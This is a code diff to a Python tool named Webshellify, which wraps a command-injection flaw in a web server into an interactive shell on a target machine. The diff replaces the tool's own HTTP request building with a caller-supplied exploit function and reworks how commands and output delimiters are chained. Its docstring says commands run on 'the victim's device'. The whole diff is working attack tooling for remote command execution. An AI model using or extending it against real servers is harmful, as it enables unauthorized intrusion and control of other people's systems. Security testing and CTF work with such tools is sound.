@@ -4,7 +4,6 @@ from colorama import Back, Fore, Style
 import cursor
 import getch
 import re
-import requests as req
 import sys
 import urllib
 
@@ -20,20 +19,22 @@ class Webshellify:
     string "CMDFUZZ" in either the request body or request query. This fuzzing string
     can be altered if necessary.
     """
-    content_types = [
-        "text/plain",
-        "application/x-www-form-urlencoded"
-    ]
-    def __init__(self, host, path, debug=False, **args):
+    def __init__(self, exploit_fun: str, debug=False, delimiter="output", **args):
         """
         Usage:
         If the vulnerable webpage is at http://localhost/vuln/path, then the correct
         initialization for a Webshellify instance would be:
-        `wshell = Webshellify("localhost", "/vuln/path", [options])`
+        `wshell = Webshellify(exploit_function, [options])`
+
+        where `exploit_function` is some function that can pass in a shell
+        command that will be run on the victim's device and returns the data
+        responded by the webserver
 
         options then include:
         - debug: (boolean) Enable debugging messages, false by default
+        - delimiter: (string) An unused word to delimit the output by
         """
+        self.exploit_fun = exploit_fun
         # store necessary information that will improve the webshell
         self.workdir = "/"
         self.parentdir = "/"
@@ -41,27 +42,9 @@ class Webshellify:
         self.host = ""
         self.user = ""
 
-        self.delimiter = "output"
-
-        self.host = host
-        if("://" in self.host): # remove "http://" portion
-            self.host = host.split("://")[-1]
-
-        self.path = path
-        if(self.path[0] == '/'):
-            self.path = path [1:]
+        self.delimiter = delimiter
 
         self.debug = debug
-
-        # necessary request information
-        self.headers = {
-            "User-Agent" : "curl/7.82.0",
-            "Accept" : "*/*",
-            "Host" : self.host,
-            "Content-Type": "application/x-www-form-urlencoded",
-        }
-        self.cookies = {}
-        self.method = "POST"
 
         self.body = ""
         self.queries = {}
@@ -77,10 +60,16 @@ class Webshellify:
         """
         commands = ""
         if(chdir):
-            commands += f"cd {self.workdir};"
+            commands += f"cd {self.workdir} && "
 
-        commands += f"echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`';"
-        commands += f"echo '`{self.delimiter}-wd`'; pwd; echo '`/{self.delimiter}-wd`';"
+        command = re.sub("(\.\.$)|(\.\.\/)", self.parentdir+'/', command)
+        command = re.sub("(\.$)|(\.\/)", self.parentdir+'/', command)
+
+        commands += f"echo '`{self.delimiter}`' && {command} && echo '`/{self.delimiter}`' && "
+        commands += f"echo '`{self.delimiter}-wd`' && pwd && echo '`/{self.delimiter}-wd`';"
+
+        if(self.debug):
+            print(f"cmd is: {commands}")
         return commands
 
     def __extract_output(self, raw):
@@ -129,51 +118,10 @@ match: {output_re.findall(raw)}""")
         user and the output of the previous command
         """
         cmd = self.__gen_command(command, chdir=chdir)
-        # generate query
-        query_str = "?"
-        for key, value in enumerate(self.queries):
-            if(self.cmd_fuzz in value):
-                value = value.replace(self.cmd_fuzz, cmd)
-            query_str += "{key}={value}&"
-        query_str = query_str[:-1] # remove the last character (either '?' or '&')
 
-        # generate cookies
-        cookie_dict = {}
-        for key, value in self.cookies.items():
-            if(self.cmd_fuzz in value):
-                value = value.replace(self.cmd_fuzz, cmd)
-            cookie_dict[key] = value
+        resp = self.exploit_fun(cmd)
 
-        # generate body (if it is neither a GET nor a HEAD request)
-        body_str = self.body
-        if(self.cmd_fuzz in body_str):
-            body_str = body_str.replace(self.cmd_fuzz, cmd)
-
-        # generate url
-        url = f"http://{self.host}/{self.path}{query_str}"
-
-        # send request with payload
-        if(self.debug):
-            print(f"""
-[debug] in funct `send_command`
-sent
-----
-method: {self.method.upper()}
-url: {url}
-cookies: {cookie_dict}
-data: {body_str}
-headers: {self.headers}
-"""
-            )
-
-        resp = req.request(
-                self.method.upper(),
-                url,
-                cookies=cookie_dict,
-                data=body_str,
-                headers=self.headers)
-
-        return self.__extract_output(resp.text)
+        return self.__extract_output(str(resp))
 
     def __get_parent_dir(self, workdir):
         """
@@ -283,32 +231,6 @@ headers: {self.headers}
                 print(e)
         cursor.show()
 
-    def set_body(self, body):
-        self.body = body
-
-    def set_query_param(self, key, value):
-        self.queries[key] = value
-
-    def set_header(self, key, value):
-        self.headers[key] = value
-
-    def set_cookie(self, key, value):
-        self.cookies[key] = value
-
-    def set_method(self, method):
-        self.method = method
-
-    def set_fuzz_word(self, fuzz):
-        self.cmd_fuzz = fuzz
-
-    def set_delimiter(self, delimiter):
-        """
-        Changes the delimiter that isolates the program's output
-
-        This should be used if the server outputs data that matches the form of the
-        current delimiter
-        """
-        self.delimiter = delimiter
 class _input_str:
     """
     Attempts to improve the text input function that can be used in comparison to
